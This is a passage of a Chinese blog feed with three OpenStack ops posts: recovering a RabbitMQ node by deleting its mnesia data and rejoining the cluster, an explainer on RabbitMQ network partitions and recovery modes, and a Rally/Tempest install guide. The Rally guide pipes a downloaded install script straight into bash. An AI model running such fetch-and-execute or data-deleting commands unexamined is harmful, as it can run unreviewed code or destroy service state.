        <content type="html"><![CDATA[<h3 id="问题描述"><a href="#问题描述" class="headerlink" title="问题描述"></a>问题描述</h3><p>原有的 rabbitmq 集群出现问题，无法启动，尝试删除 /var/lib/rabbitmq/.erlang.cookie 重新组集群，依旧无法启动</p><figure class="highlight livecodeserver"><table><tr><td class="code"><pre><span class="line"><span class="comment"># systemctl start rabbitmq-server.service</span></span><br><span class="line">Job <span class="keyword">for</span> rabbitmq-server.service failed because <span class="keyword">the</span> control <span class="built_in">process</span> exited <span class="keyword">with</span> error code. See <span class="string">&quot;systemctl status rabbitmq-server.service&quot;</span> <span class="keyword">and</span> <span class="string">&quot;journalctl -xe&quot;</span> <span class="keyword">for</span> details.</span><br></pre></td></tr></table></figure><h3 id="解决分析"><a href="#解决分析" class="headerlink" title="解决分析"></a>解决分析</h3><p>查看错误日志</p><figure class="highlight axapta"><table><tr><td class="code"><pre><span class="line"><span class="meta"># journalctl -xe</span></span><br><span class="line">-- Subject: Unit rabbitmq-<span class="keyword">server</span>.service has begun start-up</span><br><span class="line">-- Defined-By: systemd</span><br><span class="line">-- Support: http:<span class="comment">//lists.freedesktop.org/mailman/listinfo/systemd-devel</span></span><br><span class="line">-- </span><br><span class="line">-- Unit rabbitmq-<span class="keyword">server</span>.service has begun starting up.</span><br><span class="line">Nov <span class="number">24</span> <span class="number">14</span>:<span class="number">26</span>:<span class="number">20</span> controller03 rabbitmq-<span class="keyword">server</span>[<span class="number">13522</span>]: BOOT FAILED</span><br><span class="line">Nov <span class="number">24</span> <span class="number">14</span>:<span class="number">26</span>:<span class="number">20</span> controller03 rabbitmq-<span class="keyword">server</span>[<span class="number">13522</span>]: ===========</span><br><span class="line">Nov <span class="number">24</span> <span class="number">14</span>:<span class="number">26</span>:<span class="number">20</span> controller03 rabbitmq-<span class="keyword">server</span>[<span class="number">13522</span>]: Error description:</span><br><span class="line">Nov <span class="number">24</span> <span class="number">14</span>:<span class="number">26</span>:<span class="number">20</span> controller03 rabbitmq-<span class="keyword">server</span>[<span class="number">13522</span>]: &#123;error,&#123;inconsistent_cluster,<span class="string">&quot;Node rabbit@controller03 thinks it&#x27;s clustered with node rabbit@controller02, but rabbit@controller02 disagrees&quot;</span>&#125;&#125;</span><br><span class="line">Nov <span class="number">24</span> <span class="number">14</span>:<span class="number">26</span>:<span class="number">20</span> controller03 rabbitmq-<span class="keyword">server</span>[<span class="number">13522</span>]: Log files (may contain more information):</span><br><span class="line">Nov <span class="number">24</span> <span class="number">14</span>:<span class="number">26</span>:<span class="number">20</span> controller03 rabbitmq-<span class="keyword">server</span>[<span class="number">13522</span>]: /<span class="built_in">var</span>/log/rabbitmq/rabbit@controller03.log</span><br><span class="line">Nov <span class="number">24</span> <span class="number">14</span>:<span class="number">26</span>:<span class="number">20</span> controller03 rabbitmq-<span class="keyword">server</span>[<span class="number">13522</span>]: /<span class="built_in">var</span>/log/rabbitmq/rabbit@controller03-sasl.log</span><br><span class="line">Nov <span class="number">24</span> <span class="number">14</span>:<span class="number">26</span>:<span class="number">20</span> controller03 rabbitmq-<span class="keyword">server</span>[<span class="number">13522</span>]: Stack trace:</span><br><span class="line">Nov <span class="number">24</span> <span class="number">14</span>:<span class="number">26</span>:<span class="number">20</span> controller03 rabbitmq-<span class="keyword">server</span>[<span class="number">13522</span>]: [&#123;rabbit_mnesia,check_cluster_consistency,<span class="number">0</span>,</span><br><span class="line">Nov <span class="number">24</span> <span class="number">14</span>:<span class="number">26</span>:<span class="number">20</span> controller03 rabbitmq-<span class="keyword">server</span>[<span class="number">13522</span>]: [&#123;file,<span class="string">&quot;src/rabbit_mnesia.erl&quot;</span>&#125;,&#123;line,<span class="number">598</span>&#125;]&#125;,</span><br><span class="line">Nov <span class="number">24</span> <span class="number">14</span>:<span class="number">26</span>:<span class="number">20</span> controller03 rabbitmq-<span class="keyword">server</span>[<span class="number">13522</span>]: &#123;rabbit,<span class="string">&#x27;-boot/0-fun-0-&#x27;</span>,<span class="number">0</span>,[&#123;file,<span class="string">&quot;src/rabbit.erl&quot;</span>&#125;,&#123;line,<span class="number">275</span>&#125;]&#125;,</span><br><span class="line">Nov <span class="number">24</span> <span class="number">14</span>:<span class="number">26</span>:<span class="number">20</span> controller03 rabbitmq-<span class="keyword">server</span>[<span class="number">13522</span>]: &#123;rabbit,start_it,<span class="number">1</span>,[&#123;file,<span class="string">&quot;src/rabbit.erl&quot;</span>&#125;,&#123;line,<span class="number">296</span>&#125;]&#125;,</span><br><span class="line">Nov <span class="number">24</span> <span class="number">14</span>:<span class="number">26</span>:<span class="number">20</span> controller03 rabbitmq-<span class="keyword">server</span>[<span class="number">13522</span>]: &#123;init,start_it,<span class="number">1</span>,[]&#125;,</span><br><span class="line">Nov <span class="number">24</span> <span class="number">14</span>:<span class="number">26</span>:<span class="number">20</span> controller03 rabbitmq-<span class="keyword">server</span>[<span class="number">13522</span>]: &#123;init,start_em,<span class="number">1</span>,[]&#125;]</span><br><span class="line">Nov <span class="number">24</span> <span class="number">14</span>:<span class="number">26</span>:<span class="number">21</span> controller03 rabbitmq-<span class="keyword">server</span>[<span class="number">13522</span>]: &#123;<span class="string">&quot;init terminating in do_boot&quot;</span>,&#123;error,&#123;inconsistent_cluster,<span class="string">&quot;Node rabbit@controller03 thinks it&#x27;s clustered with node rabbit@controller02, but rabbit@controller02 disagrees&quot;</span>&#125;&#125;&#125;</span><br><span class="line">Nov <span class="number">24</span> <span class="number">14</span>:<span class="number">26</span>:<span class="number">21</span> controller03 rabbitmq-<span class="keyword">server</span>[<span class="number">13522</span>]: init terminating <span class="keyword">in</span> do_boot ()</span><br><span class="line">Nov <span class="number">24</span> <span class="number">14</span>:<span class="number">26</span>:<span class="number">22</span> controller03 rabbitmq-<span class="keyword">server</span>[<span class="number">13522</span>]: Crash dump <span class="keyword">is</span> being written to: erl_crash.dump...done</span><br><span class="line">Nov <span class="number">24</span> <span class="number">14</span>:<span class="number">26</span>:<span class="number">22</span> controller03 systemd[<span class="number">1</span>]: rabbitmq-<span class="keyword">server</span>.service: main process exited, code=exited, status=<span class="number">1</span>/FAILURE</span><br></pre></td></tr></table></figure><span id="more"></span><p>可以看到错误描述</p><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">&#123;error,&#123;inconsistent_cluster,<span class="string">&quot;Node rabbit@controller03 thinks it&#x27;s clustered with node rabbit@controller02, but rabbit@controller02 disagrees&quot;</span>&#125;&#125;</span><br></pre></td></tr></table></figure><p>controller03 认为 controller02 是其 cluster node,但是controller02并不是</p><p>推测是之前集群残留的cluster信息，导致认证失败。官网查询到因为mnesia的信息残留，故会认证失败。</p><h3 id="解决办法"><a href="#解决办法" class="headerlink" title="解决办法"></a>解决办法</h3><h4 id="1-删除已有-mnesia-信息"><a href="#1-删除已有-mnesia-信息" class="headerlink" title="1. 删除已有 mnesia 信息"></a>1. 删除已有 mnesia 信息</h4><figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"># rm <span class="regexp">/var/</span>lib<span class="regexp">/rabbitmq/m</span>nesia</span><br></pre></td></tr></table></figure><h4 id="2-重启服务-状态恢复正常"><a href="#2-重启服务-状态恢复正常" class="headerlink" title="2. 重启服务,状态恢复正常"></a>2. 重启服务,状态恢复正常</h4><figure class="highlight prolog"><table><tr><td class="code"><pre><span class="line"># systemctl restart rabbitmq-server.service</span><br><span class="line"></span><br><span class="line">rabbitmqctl cluster_status</span><br><span class="line"><span class="symbol">Cluster</span> status of node rabbit@controller03 ...</span><br><span class="line">[&#123;nodes,[&#123;disc,[rabbit@controller03]&#125;]&#125;,</span><br><span class="line"> &#123;running_nodes,[rabbit@controller03]&#125;,</span><br><span class="line"> &#123;cluster_name,&lt;&lt;<span class="string">&quot;rabbit@controller03&quot;</span>&gt;&gt;&#125;,</span><br><span class="line"> &#123;partitions,[]&#125;,</span><br><span class="line"> &#123;alarms,[&#123;rabbit@controller03,[]&#125;]&#125;]</span><br></pre></td></tr></table></figure><h4 id="3-加入集群查看状态"><a href="#3-加入集群查看状态" class="headerlink" title="3. 加入集群查看状态"></a>3. 加入集群查看状态</h4><figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line"><span class="meta"># rabbitmqctl stop_app</span></span><br><span class="line">Stopping node rabbit<span class="symbol">@controller03</span> ...</span><br><span class="line">[root<span class="symbol">@controller03</span> ~]<span class="meta"># rabbitmqctl join_cluster --ram rabbit@controller01</span></span><br><span class="line">Clustering node rabbit<span class="symbol">@controller03</span> <span class="keyword">with</span> rabbit<span class="symbol">@controller01</span> ...</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta"># rabbitmqctl start_app</span></span><br><span class="line">Starting node rabbit<span class="symbol">@controller03</span> ...</span><br><span class="line"></span><br><span class="line"><span class="meta"># rabbitmqctl cluster_status</span></span><br><span class="line">Cluster status of node rabbit<span class="symbol">@controller03</span> ...</span><br><span class="line">[&#123;nodes,[&#123;disc,[rabbit<span class="symbol">@controller01]</span>&#125;,</span><br><span class="line">         &#123;ram,[rabbit<span class="symbol">@controller03</span>,rabbit<span class="symbol">@controller02]</span>&#125;]&#125;,</span><br><span class="line"> &#123;running_nodes,[rabbit<span class="symbol">@controller01</span>,rabbit<span class="symbol">@controller03]</span>&#125;,</span><br><span class="line"> &#123;cluster_name,&lt;&lt;<span class="string">&quot;rabbit@controller01&quot;</span>&gt;&gt;&#125;,</span><br><span class="line"> &#123;partitions,[]&#125;,</span><br><span class="line"> &#123;alarms,[&#123;rabbit<span class="symbol">@controller01</span>,[]&#125;,&#123;rabbit<span class="symbol">@controller03</span>,[]&#125;]&#125;]</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> openstack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> openstack </tag>
            
            <tag> rabbitmq </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>RabbitMQ Network Partition</title>
      <link href="openstack/rabbitmq-network-partition.html"/>
      <url>openstack/rabbitmq-network-partition.html</url>
      
        <content type="html"><![CDATA[<p>线上的rabbitmq集群经常无法访问，集群状态也不正常，查找到如下资料：</p><h3 id="一-环境概述"><a href="#一-环境概述" class="headerlink" title="一. 环境概述"></a>一. 环境概述</h3><h4 id="1-3个rabbitmq-node组成的集群镜像，当客户端无法连接或者连接rabbitmq超时的时候，集群的状态如下："><a href="#1-3个rabbitmq-node组成的集群镜像，当客户端无法连接或者连接rabbitmq超时的时候，集群的状态如下：" class="headerlink" title="1. 3个rabbitmq node组成的集群镜像，当客户端无法连接或者连接rabbitmq超时的时候，集群的状态如下："></a>1. 3个rabbitmq node组成的集群镜像，当客户端无法连接或者连接rabbitmq超时的时候，集群的状态如下：</h4><figure class="highlight perl"><table><tr><td class="code"><pre><span class="line"><span class="comment"># rabbitmqctl cluster_status</span></span><br><span class="line">Cluster status of node rabbit@controller02 ...</span><br><span class="line">[&#123;nodes,[&#123;disc,[rabbit@controller01]&#125;,</span><br><span class="line">         &#123;ram,[rabbit@controller03,rabbit@controller02]&#125;]&#125;,</span><br><span class="line"> &#123;running_nodes,[rabbit@controller03,rabbit@controller02]&#125;,</span><br><span class="line"> &#123;cluster_name,&lt;&lt;<span class="string">&quot;rabbit@controller01&quot;</span>&gt;&gt;&#125;,</span><br><span class="line"> &#123;partitions,[&#123;rabbit@controller02,[rabbit@controller01]&#125;]&#125;,</span><br><span class="line"> &#123;alarms,[&#123;rabbit@controller03,[]&#125;,&#123;rabbit@controller02,[]&#125;]&#125;]</span><br></pre></td></tr></table></figure><p>可以看到partitions中有内容，发生了网络分区。</p><span id="more"></span><h4 id="2-查看网卡状态，发现有部分丢包"><a href="#2-查看网卡状态，发现有部分丢包" class="headerlink" title="2. 查看网卡状态，发现有部分丢包"></a>2. 查看网卡状态，发现有部分丢包</h4><figure class="highlight apache"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ifconfig </span></span><br><span class="line"><span class="attribute">eno16780032</span>: flags=<span class="number">4163</span>&lt;UP,BROADCAST,RUNNING,MULTICAST&gt;  mtu <span class="number">1500</span></span><br><span class="line">        <span class="attribute">inet</span> <span class="number">192.168.105.10</span>  netmask <span class="number">255.255.255.0</span>  broadcast <span class="number">192.168.105.255</span></span><br><span class="line">        <span class="attribute">inet6</span> fe<span class="number">80</span>::<span class="number">250</span>:<span class="number">56</span>ff:fe<span class="number">93</span>:<span class="number">3</span>c<span class="number">8</span>b  prefixlen <span class="number">64</span>  scopeid <span class="number">0</span>x<span class="number">20</span>&lt;link&gt;</span><br><span class="line">        <span class="attribute">ether</span> <span class="number">00</span>:<span class="number">50</span>:<span class="number">56</span>:<span class="number">93</span>:<span class="number">3</span>c:<span class="number">8</span>b  txqueuelen <span class="number">1000</span>  (Ethernet)</span><br><span class="line">        <span class="attribute">RX</span> packets <span class="number">2109838432</span>  bytes <span class="number">1014280621917</span> (<span class="number">944</span>.<span class="number">6</span> GiB)</span><br><span class="line">        <span class="attribute">RX</span> errors <span class="number">0</span>  dropped <span class="number">12153</span>  overruns <span class="number">0</span>  frame <span class="number">0</span></span><br><span class="line">        <span class="attribute">TX</span> packets <span class="number">1799546189</span>  bytes <span class="number">1089416841077</span> (<span class="number">1014</span>.<span class="number">5</span> GiB)</span><br><span class="line">        <span class="attribute">TX</span> errors <span class="number">0</span>  dropped <span class="number">0</span> overruns <span class="number">0</span>  carrier <span class="number">0</span>  collisions <span class="number">0</span> </span><br></pre></td></tr></table></figure><h4 id="3-rabbitmq日志中有如下-ERROR"><a href="#3-rabbitmq日志中有如下-ERROR" class="headerlink" title="3. rabbitmq日志中有如下 ERROR"></a>3. rabbitmq日志中有如下 ERROR</h4><figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">=ERROR REPORT==== <span class="number">25</span>-Sep-<span class="symbol">2017:</span><span class="symbol">:09</span><span class="symbol">:50</span><span class="symbol">:59</span> ===</span><br><span class="line">Mnesia(rabbit@controller02)<span class="symbol">:</span> ** ERROR ** mnesia_event got &#123;inconsistent_database, running_partitioned_network, rabbit@controller01&#125;</span><br></pre></td></tr></table></figure><h3 id="二-网络分区"><a href="#二-网络分区" class="headerlink" title="二. 网络分区"></a>二. 网络分区</h3><p>RabbitMQ 会将 fabric 信息保存在 Erlang 的分布式数据库 Mnesia 中。而和网络分区相关的许多细节问题都和 Mnesia 的行为相关。</p><h4 id="1-网络分区的探测"><a href="#1-网络分区的探测" class="headerlink" title="1. 网络分区的探测"></a>1. 网络分区的探测</h4><p>Mnesia 判定某个 node 失效的根据是，如果其他 node 无法连接该 node 的时间达到 1 分钟以上（详情请参 考 net_ticktime 的 说明）。当这两个 node 恢复到能联系上的状态时，都会认为对端 node 已 down 掉了，此时 Mnesia 将会判定发生了网络分区。这种情况会被记录进 RabbitMQ 的日志文件中，如下： </p><figure class="highlight excel"><table><tr><td class="code"><pre><span class="line">=ERROR REPORT==== <span class="number">15</span>-Oct-<span class="symbol">2012:</span><span class="symbol">:18</span><span class="symbol">:02</span><span class="symbol">:30</span> ===</span><br><span class="line">Mnesia(rabbit@smacmullen)<span class="symbol">:</span> ** ERROR ** mnesia_event got&#123;inconsistent_database,running_partitioned_network, hare@smacmullen&#125; </span><br></pre></td></tr></table></figure><p>RabbitMQ node 会记录下在当前 node 运行期间是否发生过这个 event ，并会通过 rabbitmqctl cluster_status 命令和管理插件将该信息暴露出来。 在正常情况下，rabbitmqctl cluster_status 显示结果中的 partitions 部分为空列表 []:</p><figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line"><span class="meta"># rabbitmqctl cluster_status</span></span><br><span class="line"></span><br><span class="line">Cluster status of node rabbit<span class="symbol">@smacmullen</span> ...</span><br><span class="line">[&#123;nodes,[&#123;disc,[hare<span class="symbol">@smacmullen</span>,rabbit<span class="symbol">@smacmullen]</span>&#125;]&#125;,</span><br><span class="line"> &#123;running_nodes,[rabbit<span class="symbol">@smacmullen</span>,hare<span class="symbol">@smacmullen]</span>&#125;, </span><br><span class="line"> &#123;partitions,[]&#125;] </span><br><span class="line">...done. </span><br></pre></td></tr></table></figure><p>如果发生了网络分区，那么会有如下信息显示出来：</p><figure class="highlight autoit"><table><tr><td class="code"><pre><span class="line"><span class="meta"># rabbitmqctl cluster_status</span></span><br><span class="line"></span><br><span class="line">Cluster status of node rabbit<span class="symbol">@smacmullen</span> ...</span><br><span class="line">[&#123;nodes,[&#123;disc,[hare<span class="symbol">@smacmullen</span>,rabbit<span class="symbol">@smacmullen]</span>&#125;]&#125;,</span><br><span class="line"> &#123;running_nodes,[rabbit<span class="symbol">@smacmullen</span>,hare<span class="symbol">@smacmullen]</span>&#125;, </span><br><span class="line"> &#123;partitions,[&#123;rabbit<span class="symbol">@smacmullen</span>,[hare<span class="symbol">@smacmullen]</span>&#125;, </span><br><span class="line">              &#123;hare<span class="symbol">@smacmullen</span>,[rabbit<span class="symbol">@smacmullen]</span>&#125;]&#125;] </span><br><span class="line">...done. </span><br></pre></td></tr></table></figure><h4 id="2-当网络分区发生时"><a href="#2-当网络分区发生时" class="headerlink" title="2. 当网络分区发生时"></a>2. 当网络分区发生时</h4><p>当发生网络分区时，分区的两侧（或者多侧）均能够独立的进化，同时认为另外一侧已经处于不可用状态。其中 queue、binding、exchange 均能够在各个分区中创建和删除。而由于网络分区而被割裂的==镜像队列==，最终会演变成每个分区中产生一个 master ，并且每一侧==均能独立进行工作==。其他未定义和奇怪的行为也可能发生。<br>需要额外注意的是， 当网络分区的情况得到恢复后，上述问题仍旧存在，直到你采取行动进行修复。</p><h4 id="3-由于-挂起-恢复-而导致的分区"><a href="#3-由于-挂起-恢复-而导致的分区" class="headerlink" title="3. 由于 挂起/恢复 而导致的分区"></a>3. 由于 挂起/恢复 而导致的分区</h4><p>当我们谈及“网络”分区时，其真正的意思是指：在任何情况下，同一个集群中的 node 在没有 down 掉的情况下，相互之前的通信被中断的情况。除了网络失效导致的分区外，当挂起和恢复集群 node 所在机器的整个 OS ，同样能够导致分区的发生。这种情况下，被挂起的 node 并不认为自己已经失效了，或者被停掉了，但是同一集群中的其他 node 会认为是这样。<br>你能通过合上笔记本盖子的方式，挂起运行在笔记本上的集群中的一个 node ，但更常见的情况是由于虚拟机被监管程序挂起导致。尽管允许将 RabbitMQ 集群运行在虚拟化环境中，你需要确保 VM 不会被在运行中被挂起。需要注意的是，一些虚拟化技术特性，例如将 VM 从一个 host ==迁移==至另外一个 host 时，会导致 VM 被挂起。<br>由于挂起导致的网络分区，在恢复的时候行为是不对称的。被挂起的 node 将有可能不会认为其他 node 已经 down 掉，但是会被集群中的其他 node 看作 down 掉。这个行为对于 pause_minority 模式来说有特殊含义。</p><h4 id="4-从网络分区中恢复"><a href="#4-从网络分区中恢复" class="headerlink" title="4. 从网络分区中恢复"></a>4. 从网络分区中恢复</h4><p>为了从网络分区中恢复，首先要选择你最相信的一个分区。选中的分区将会作为“权威机构”被 Mnesia 使用。任何发生在未被选中分区中的变更将会丢失。<br>停止其他分区的所有 node ，之后再重新启动它们。当它们重新加入到集群中时，它们将会从受信分区恢复自身的状态。最后，你同样应该重启受信分区中的所有 node 以便清除警告信息。<br>一种更简单的方式是，停止整个集群，再==重启集群==。如果你是按照这种方式来恢复网络分区的，那么请确保你所启动的第一个 node 为受信分区中的 node 。</p><h4 id="5-自动处理网络分区"><a href="#5-自动处理网络分区" class="headerlink" title="5. 自动处理网络分区"></a>5. 自动处理网络分区</h4><p>RabbitMQ 同样提供了三种方式来自动处理网络分区问题：pause-minority 模式，pause-if-all-down 模式和 autoheal 模式<br>在 <code>pause-minority</code> 模式中，一旦发现有其他 node 失效，RabbitMQ 将会自动停止“特定”集群中的所有 node ，只要确定该集群为少数派集群（即少于或等于半数 node 数）。可以看出，这种策略是选择了 CAP 理论中的分区容错性（P），而放弃了可用性（A）。这种策略保证了当发生网络分区时，最多只有一个分区中的 nodes 会继续工作。而处于少数派集群中的 node 将在分区发生的开始就被停止，在分区恢复后重新启动。<br>在 <code>pause-if-all-down</code> 模式中，RabbitMQ 会自动停止集群中的 node ，只要其无法与列举出来的任何 node 进行通信 。这和上一个模式比较接近，但是该模式允许管理员来决定根据哪些 node 做判定，而不直接取决于与上下文环境。例如，如果集群是由位于数据中心 A 的两个 node ，以及位于数据中心 B 的两个 node 构成的，并且两个数据中心之间的连接断开了，那么 pause-minority 模式会导致所有的 node 被停掉。而对于 pause-if-all-down 模式来说，如果管理员列举出来的 node 是数据中心 A 中的那两个 node ，那么将只有数据中心 B 里的两个 node 被停掉。需要注意的是，可能存在列举出来的多个 node 本身就处于无法通信的不同分区中：在这种情况下，将不会有任何 node 被停掉。这也就是为什么存在一个额外的 ignore/autoheal 参数来进一步指示如何从分区中恢复。<br>在 <code>autoheal</code> 模式中，RabbitMQ 将在发生网络分区时，自动决议出一个胜出分区，并重启不在该分区中的所有 node 。与 pause_minority 模式不同的是，autoheal 模式是在分区结束阶段（已经形成稳定的分区）是起作用，而不是在分区开始阶段（刚刚开始分区）。<br>胜出分区是获得最多客户端连接的那个分区（或者如果产生了平局，则选择拥有最多 node 的那个；如果仍旧是平局，则随机选择一个分区）。 </p><p>你可以在配置文件中设置 cluster_partition_handling 项的值为上述任何值： </p><figure class="highlight puppet"><table><tr><td class="code"><pre><span class="line">pause_minority</span><br><span class="line">&#123;pause_if_all_down, [nodes], ignore | autoheal&#125;</span><br><span class="line">autoheal</span><br></pre></td></tr></table></figure><p>需要明确的一点是，允许 RabbitMQ 自行处理网络分区问题并不代表你可以认为该问题就不存在了。无论何时网络分区都会导致 RabbitMQ 集群产生问题。你只是在可能遇到何种层次的问题上面多了些选择。正如在本文开始处所说的，如果你打算基于不可靠连接接入 RabbitMQ 集群，你应该使用 federation 或 shovel 。 </p><h3 id="三-恢复策略选择"><a href="#三-恢复策略选择" class="headerlink" title="三. 恢复策略选择"></a>三. 恢复策略选择</h3><ol><li><code>ignore</code> - 要求你所在的网络环境非常可靠。例如，你的所有 node 都在同一个机架上，通过交换机互联，并且该交换机还是与外界通信的必经之路。 并且你不想因为集群中的任意 node 失效而导致集群停工，即使集群中有 node 真的失效(默认策略是ignore )。</li><li><code>pause_minority</code> - 你的网络环境可能没有那么可靠。例如，你在 EC2 上构建了一个横跨 3 个 AZs 的集群，并且你假定同一时刻最多只有一个 AZ 会失效。在这种场景下，你希望剩余的 2 个 AZs 能够继续工作，直到失效 AZ 恢复后，位于其中的 node 重新自动加入集群，并且不会造成任何混乱。 </li><li><code>autoheal</code> - 你的网络环境可能是不可靠的。你会更加关心服务的可持续性，而非数据完整性。你可以构建一个包含 2 个 node 的集群。 </li></ol><p>综上这里我们选择 pause_minority 策略</p><h3 id="四-参考资料"><a href="#四-参考资料" class="headerlink" title="四. 参考资料"></a>四. 参考资料</h3><p><a href="http://www.rabbitmq.com/partitions.html">Clustering and Network Partitions</a><br><a href="https://yq.aliyun.com/articles/42213?spm=5176.100240.searchblog.8.pU5Oht">RabbitMQ 之 Clustering 和 Network Partition（翻译）</a></p>]]></content>
      
      
      <categories>
          
          <category> openstack </category>
          
      </categories>
      
      
        <tags>
            
            <tag> openstack </tag>
            
            <tag> rabbitmq </tag>
            
            <tag> partition </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>通过 Rally 进行 OpenStack Tempest 测试</title>
      <link href="openstack/use-rally-to-openstack-tempest-test.html"/>
      <url>openstack/use-rally-to-openstack-tempest-test.html</url>
      
        <content type="html"><![CDATA[<h2 id="Rally-基本介绍"><a href="#Rally-基本介绍" class="headerlink" title="Rally 基本介绍"></a>Rally 基本介绍</h2><p>Rally 是OpenStack社区推出开源测试工具，可用于对OpenStack各个组件进行性能测试。通过使用Rally组件，用户可完成OpenStack云计算平台的安装部署、功能验证、大规模负载测试(性能测试)、输出测试报告等一系列动作。<br>Rally 的概况和结构如下图所示：<br><img data-src="/images/uploads/2017/09/2916469037.png" alt="image"><br>Rally 主要包括三大部分：</p><ul><li>Deploy engine：这不是一个真的部署工具，它只是一个插件形式的东西，它可以和其他部署工具（比如 DevStack，Fuel，Anvil 等）一起工作来简化和统一部署流程。</li><li>Verification：使用tempest验证已经部署的openstack云环境的功能。</li><li>Benchmark engine：性能测试</li></ul><h2 id="Tempest-基本介绍"><a href="#Tempest-基本介绍" class="headerlink" title="Tempest 基本介绍"></a>Tempest 基本介绍</h2><p>Tempest 是一个旨在为云计算平台 OpenStack 提供集成功能测试的开源项目，包含了 Openstack 基本组件（nova, keystone, glance, neutron, cinder 等）的 API 测试用例与场景。它是基于 unittest2 和 nose 建立的，灵活且易于扩展及维护，使得 OpenStack 相关测试效率得到大幅度提升。</p><h2 id="安装-Rally"><a href="#安装-Rally" class="headerlink" title="安装 Rally"></a>安装 Rally</h2><span id="more"></span><h3 id="1-安装依赖包"><a href="#1-安装依赖包" class="headerlink" title="1. 安装依赖包"></a>1. 安装依赖包</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># yum install python-pip lsb_release gcc gmp-devel libffi-devel libxml2-devel libxslt-devel openssl-devel postgresql-devel python-devel redhat-rpm-config</span></span><br></pre></td></tr></table></figure><h3 id="2-安装-rally-最简单的方法就是使用下面的安装脚本"><a href="#2-安装-rally-最简单的方法就是使用下面的安装脚本" class="headerlink" title="2. 安装 rally 最简单的方法就是使用下面的安装脚本"></a>2. 安装 rally 最简单的方法就是使用下面的安装脚本</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">wget -q -O- https://raw.githubusercontent.com/openstack/rally/master/install_rally.sh | bash</span><br><span class="line"><span class="comment"># or using curl:</span></span><br><span class="line">curl https://raw.githubusercontent.com/openstack/rally/master/install_rally.sh | bash</span><br></pre></td></tr></table></figure><p>如果用普通用户执行脚本，Rally 会在 ==~/rally/== 下创建一个新的虚拟环境并安装在这里，使用 sqlite作为数据库后端。如果使用 root 用户执行脚本，Rally 会安装在系统路径，更多的安装选项，可以参考<a href="https://rally.readthedocs.io/en/latest/install_and_upgrade/install.html#install">安装页面</a>。</p><h2 id="Rally-配置"><a href="#Rally-配置" class="headerlink" title="Rally 配置"></a>Rally 配置</h2><h3 id="1-创建-openstack-环境变量文件，加入以下内容，注意修改用户名、密码、认证地址、region-name-等内容。"><a href="#1-创建-openstack-环境变量文件，加入以下内容，注意修改用户名、密码、认证地址、region-name-等内容。" class="headerlink" title="1. 创建 openstack 环境变量文件，加入以下内容，注意修改用户名、密码、认证地址、region_name 等内容。"></a>1. 创建 openstack 环境变量文件，加入以下内容，注意修改用户名、密码、认证地址、region_name 等内容。</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># vim admin-openrc</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">unset</span> OS_SERVICE_TOKEN</span><br><span class="line">    <span class="built_in">export</span> OS_USERNAME=admin</span><br><span class="line">    <span class="built_in">export</span> OS_PASSWORD=admin</span><br><span class="line">    <span class="built_in">export</span> OS_AUTH_URL=http://192.168.3.222:5000/v3</span><br><span class="line">    </span><br><span class="line"><span class="built_in">export</span> OS_PROJECT_NAME=admin</span><br><span class="line"><span class="built_in">export</span> OS_USER_DOMAIN_NAME=default</span><br><span class="line"><span class="built_in">export</span> OS_PROJECT_DOMAIN_NAME=Default</span><br><span class="line"><span class="built_in">export</span> OS_IDENTITY_API_VERSION=3</span><br><span class="line"><span class="built_in">export</span> OS_REGION_NAME=RegionOne</span><br></pre></td></tr></table></figure><h3 id="2-加载环境变量"><a href="#2-加载环境变量" class="headerlink" title="2. 加载环境变量"></a>2. 加载环境变量</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># . admin-openrc</span></span><br></pre></td></tr></table></figure><h3 id="3-注册一个-Openstack-deployment，注册成功后，将会默认使用这个-deployment，同时在主目录下会有一个新的目录出现：-rally。"><a href="#3-注册一个-Openstack-deployment，注册成功后，将会默认使用这个-deployment，同时在主目录下会有一个新的目录出现：-rally。" class="headerlink" title="3. 注册一个 Openstack deployment，注册成功后，将会默认使用这个 deployment，同时在主目录下会有一个新的目录出现：.rally。"></a>3. 注册一个 Openstack deployment，注册成功后，将会默认使用这个 deployment，同时在主目录下会有一个新的目录出现：.rally。</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># rally deployment create --fromenv --name=openstack</span></span><br><span class="line"></span><br><span class="line">2017-07-31 15:44:12.509 20293 INFO rally.deployment.engines.existing [-] Save deployment <span class="string">&#x27;openstack&#x27;</span> (uuid=3403b234-76ae-4afb-9d96-49ef2d872069) with <span class="string">&#x27;openstack&#x27;</span> platform.</span><br><span class="line">+--------------------------------------+---------------------+-----------+------------------+--------+</span><br><span class="line">| uuid                                 | created_at          | name      | status           | active |</span><br><span class="line">+--------------------------------------+---------------------+-----------+------------------+--------+</span><br><span class="line">| 3403b234-76ae-4afb-9d96-49ef2d872069 | 2017-07-31T07:44:12 | openstack | deploy-&gt;finished |        |</span><br><span class="line">+--------------------------------------+---------------------+-----------+------------------+--------+</span><br><span class="line">Using deployment: 3403b234-76ae-4afb-9d96-49ef2d872069</span><br><span class="line">~/.rally/openrc was updated</span><br><span class="line"></span><br><span class="line">HINTS:</span><br><span class="line"></span><br><span class="line">* To use standard OpenStack clients, <span class="built_in">set</span> up your env by running:</span><br><span class="line"><span class="built_in">source</span> ~/.rally/openrc</span><br><span class="line">  OpenStack clients are now configured, e.g run:</span><br><span class="line">openstack image list</span><br></pre></td></tr></table></figure><h3 id="4-检查一下刚注册的-deployment-是否存在。"><a href="#4-检查一下刚注册的-deployment-是否存在。" class="headerlink" title="4. 检查一下刚注册的 deployment 是否存在。"></a>4. 检查一下刚注册的 deployment 是否存在。</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># rally deployment list</span></span><br><span 